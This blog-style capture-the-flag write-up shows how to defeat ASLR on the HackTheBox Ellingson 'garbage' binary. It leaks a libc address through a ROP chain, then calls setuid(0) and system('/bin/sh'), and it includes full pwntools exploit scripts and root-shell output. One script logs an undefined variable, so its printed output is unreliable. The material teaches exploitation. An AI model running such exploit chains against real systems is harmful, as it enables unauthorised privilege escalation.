---
layout: post
title: "Defeating ASLR Part II"
date: 2020-05-02 04:04:00 +0300
categories: hack binary-exploitation
---
[First part](/hack/binary-exploitation/2020/05/02/defeating-aslr-part-1.html) of this series contains the necessary information.
<br>
I am using [gef](https://github.com/hugsy/gef) plugin for gdb and pwntools python module

# Defeating ASLR via Address Leakage

We're going to use the binary from the hackthebox machine Ellingson here for demonstration purposes. I do not provide the binary.
<br>
We're gonna use two different ways to exploit the binary. First we're gonna get the addresses manually and type them in, second we're gonna let pwntools do everything.

## Fuzzing

When you run the binary it asks for a password which you can easily get by running *strings* on the binary: N3veRF3@r1iSh3r3! The program then shows a menu with multiple options that don't do much. Let's check the enabled protections first.
<br>
```terminal
gef➤  checksec 
[+] checksec for '/root/Tuts/blogposts/smashbin/aslr_leak/garbage'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```
<br>
We have no execute bit (NX) enabled. This means we can't execute code from the stack so we're going to use return-oriented-programming (ROP). Running a basic fuzz command to check if the password input is vulnerable to buffer overflow results in a segmentation fault. 
<br>
```terminal
python -c "print 'A' * 200" | ./garbage
```
<br>
Indeed we can see the vulnerable gets call in the auth function. I should also note that the program first checks the userid and will exit if userid is not either one of 0, 1000, or 1002.
<br>
```nasm
x0040155c      mov rdi, rax       ; char *s
x0040155f      mov eax, 0
x00401564      call sym.imp.gets  ; char *gets(char *s)
```
<br>
Now that we have confirmed the overflow. Let's create a cyclic de Bruijn pattern and figure out at which byte the overflow occurs.
<br>
```terminal
gef➤  pattern create 200                                                                                                                                  
[+] Generating a pattern of 200 bytes                                                                                                                     
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaata
aaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa                                                                                                            
[+] Saved as '$_gef0' 
...
gef➤  run
Starting program: /root/Tuts/blogposts/smashbin/aslr_leak/garbage 
Enter access password: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaa
aaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

access denied.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401618 in auth ()
...
gef➤  pattern search $rsp
[+] Searching '$rsp'
[+] Found at offset 136 (little-endian search) likely
[+] Found at offset 129 (big-endian search) 
```
<br>
This shows us that the overflow occurs after the 136th byte. Let's test it.
<br>
```terminal
python -c "print 'A' * 136 + 'B' * 8" > test

gef➤  run < test                                                             
Starting program: /root/Tuts/blogposts/smashbin/aslr_leak/garbage < test
Enter access password:                                                                                                                                    
access denied.                                                                                                                                            
                                                                                                                                                          
Program received signal SIGSEGV, Segmentation fault.                                                                                                      
0x0000000000401618 in auth ()
...
gef➤  stack
────────────────────────────────────────────────────────────── Stack bottom (lower address) ──────────────────────────────────────────────────────────────
0x00007fffffffddc8│+0x0000: "BBBBBBBB"   ← $rsp ($savedip)
```
<br>
Indeed we've overwritten the $rsp with 8 bytes. We know where to place our payload so what now? Due to NX bit we can't place shellcode in the stack and execute it. We have to use ROP gadgets (I might write about these in the future) to execute a shell. For that we need the address of a  *pop rdi; ret* gadget, the address of the system in libc, and the "/bin/sh" string in libc. However, as we've learnt in the first post of this series, ASLR randomizes these addresses everytime we run the executable. The key point here is that ASLR randomizes the base address of shared libraries. Addresses of instructions in the libraries relative to the base address stays the same. Offsets of functions from the base address of libraries are available to us and are fixed. Knowing these, first we will leak the address of a libc function from the global offset table (GOT). Then we will substract the offset of the same function in libc to find the current base address of loaded libc library. Then we can use this base address to calculate the address of any libc function we want. I chose the printf function for this purpose. And how are we going to leak this address? We will simply feed the address to the puts function and write it to stdout. Puts reads the first argument from RDI register and that's why we need the *pop rdi; ret* gadget. After leaking we don't want the process to exit since this will render the leaked address invalid. Therefore we will redirect the process to the main function. So for this stage what we need are;
<br>
1. *pop rdi; ret* gadget.
2. Address of printf entry in the GOT
3. Address of puts entry in PLT
4. Address of main function

<br>
We can use the ropper tool available in gef to find the rop gadget and use essential linux commands to find the rest. Let's get to it.
<br>
```terminal
gef➤  ropper --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: /root/Tuts/blogposts/smashbin/aslr_leak/garbage
0x000000000040179b: pop rdi; ret; 
```
<br>
Address of the rop gadget is: **0x40179b**
<br>
```terminal
root@kali:~/Tuts/blogposts/smashbin/aslr_leak# objdump -D garbage | grep printf
0000000000401090 <printf@plt>:
  401090:       ff 25 b2 2f 00 00       jmpq   *0x2fb2(%rip)        # 404048 <printf@GLIBC_2.2.5>
```
<br>
Address of printf GOT entry: **0x404048**
<br>
```terminal
root@kali:~/Tuts/blogposts/smashbin/aslr_leak# objdump -D garbage | grep put
0000000000401050 <puts@plt>:
  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
```
<br>
Address of puts PLT entry: **0x401050**
<br>
```terminal
root@kali:~/Tuts/blogposts/smashbin/aslr_leak# objdump -D garbage | grep main
  401194:       ff 15 56 2e 00 00       callq  *0x2e56(%rip)        # 403ff0 <__libc_start_main@GLIBC_2.2.5>
0000000000401619 <main>:
```
<br>
Lastly, addres of main: **0x401619**
<br>
Using these knowledge let's code the first stage of our exploit.
<br>
```python
from pwn import *

p = process("./garbage")

# Stage 1 (Leaking the address of printf@GLIBC)
plt_main = p64(0x401619)
plt_put = p64(0x401050)
got_printf = p64(0x404048)
pop_rdi = p64(0x40179b)
junk = "A" * 136

#Create the payload. This will print the address of printf to stdout and jump back to the main function.
payload = junk + pop_rdi + got_printf + plt_put + plt_main

#Send the payload, parse the printed address and store it.
p.sendline(payload)
p.recvuntil("denied.")
leaked_printf = p.recv()[:8].strip().ljust(8, "\00")
leaked_printf = u64(leaked_printf)
log.success("Leaked printf@GLIBC: " + hex(leaked_printf))
```
<br>
This will return the following output. Notice the changing address at each run.
<br>
```terminal
root@kali:~/Tuts/blogposts/smashbin/aslr_leak# python exploit.py 
[+] Starting local process './garbage': pid 7677
[+] Leaked printf@GLIBC: 0x7fe5bea57440
[*] Stopped process './garbage' (pid 7677)
root@kali:~/Tuts/blogposts/smashbin/aslr_leak# python exploit.py 
[+] Starting local process './garbage': pid 7681
[+] Leaked printf@GLIBC: 0x7fb444bc4440
[*] Stopped process './garbage' (pid 7681)
```
<br>
The rest is easy. We will calculate the libc base address and using it we can calculate the address of any function in libc. Which addresses do we need? To spawn a shell we need the address of the system function and the address of the "/bin/sh" string. Original binary on the hackthebox machine has setuid bit so we are going to go for the extra juice here and call setuid to elevate our priviledges. Summing up:
<br>
1. Offset of system in libc
2. Offset of setuid in libc
3. Offset of "/bin/sh" string in libc

<br>
```terminal
root@kali:~/Tuts/blogposts/smashbin/aslr_leak# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
   235: 000000000012c3d0    99 FUNC    GLOBAL DEFAULT   14 svcerr_systemerr@@GLIBC_2.2.5
   616: 0000000000048880    45 FUNC    GLOBAL DEFAULT   14 __libc_system@@GLIBC_PRIVATE
  1426: 0000000000048880    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
```
<br>
Offset of system@GLIBC: **0x48880**
<br>
```terminal
root@kali:~/Tuts/blogposts/smashbin/aslr_leak# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep setuid
    25: 00000000000cbbe0   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5
```
<br>
Offset of setuid@GLIBC: **0xcbbe0**
<br>
```terminal
root@kali:~/Tuts/blogposts/smashbin/aslr_leak# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
 1881ac /bin/sh
```
<br>
Offset of "/bin/sh": **0x1881ac**
<br>
Let's code the second stage of our exploit and finish it. Below is the full code.
<br>
```python
from pwn import *

p = process("./garbage")

# Stage 1 (Leaking the address of printf@GLIBC)
plt_main = p64(0x401619)
plt_put = p64(0x401050)
got_printf = p64(0x404048)
pop_rdi = p64(0x40179b)
junk = "A" * 136

# Create the payload. This will print the address of printf to stdout and jump back to the main function.
payload = junk + pop_rdi + got_printf + plt_put + plt_main

# Send the payload, parse the printed address and store it.
p.sendline(payload)
p.recvuntil("denied.")
leaked_printf = p.recv()[:8].strip().ljust(8, "\00")
leaked_printf = u64(leaked_printf)
log.success("Leaked printf@GLIBC: " + hex(leaked_printf))

# Stage 2 (Obtaining the addresses and pwning)
libc_printf = 0x56440
libc_sys    = 0x48880
libc_exit   = 0x3dfc0
libc_sh     = 0x1881ac
libc_setuid = 0xcbbe0

# Calculate the the base address of libc
libc_main = leaked_printf - libc_printf
log.success("libc_main:" + hex(offset))

# Add the offsets to the base address to  obtain the addresses libc functions

sys = p64(libc_main + libc_sys)
sh = p64(libc_main + libc_sh)
setuid = p64(libc_main + libc_setuid)
# Setting 0 as the first argument to setuid will escalate to root priviliges
root = p64(0)

payload = junk + pop_rdi + root + setuid + pop_rdi + sh + sys

p.sendline(payload)
p.interactive()
```
<br>
Let's give full access to this folder and enable setuid for the binary and then switch to an unpriviledged user and test our exploit.
<br>
```terminal
root@kali:~/Tuts/blogposts/smashbin/aslr_leak# chmod 755 * 
root@kali:~/Tuts/blogposts/smashbin/aslr_leak# chmod u+s garbage 
root@kali:~/Tuts/blogposts/smashbin/aslr_leak# su - krypt 
```
<br>
Run the exploit.
<br>
```terminal
krypt@kali:/root/Tuts/blogposts/smashbin/aslr_leak$ python exploit.py 
[+] Starting local process './garbage': pid 8264
[+] Leaked printf@GLIBC: 0x7f5b29523440
[+] libc_main:0x7f5b294cd000
[*] Switching to interactive mode
Enter access password: 
access denied.
$ whoami
root
$  
```
<br>
This is the most common way to bypass ASLR. Below code does the exact same thing but instead of manually finding and typing the addresses we use some pwntools magic. The code should be easy to grasp.
<br>
```python
from pwn import *

context(os='linux', arch='amd64')

p = process("./garbage")

garbage = ELF("garbage")
rop = ROP(garbage)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Stage 1 (Leaking the address of printf@GLIBC)
junk = "A"*136
rop.search(regs=['rdi'], order = 'regs')
rop.puts(garbage.got['printf'])
rop.call(garbage.symbols['main'])
log.info("Stage 1 ROP Chain:\n" + rop.dump())

payload = junk + str(rop)
p.sendline(payload)

p.recvuntil("denied.")
leaked_printf = p.recv()[:8].strip().ljust(8, "\00")

leaked_printf = u64(leaked_printf)
log.success("Leaked printf@GLIBC: " + hex(leaked_printf))

# Stage 2 (Obtaining the addresses and pwning)
libc.address = leaked_printf - libc.symbols['printf']
rop2 = ROP(libc)
rop2.setuid(0)
rop2.system(next(libc.search('/bin/sh\x00')))
log.info("Stage 2 ROP Chain:\n" + rop2.dump())

payload = junk + str(rop2)
p.sendline(payload)

p.interactive()
```
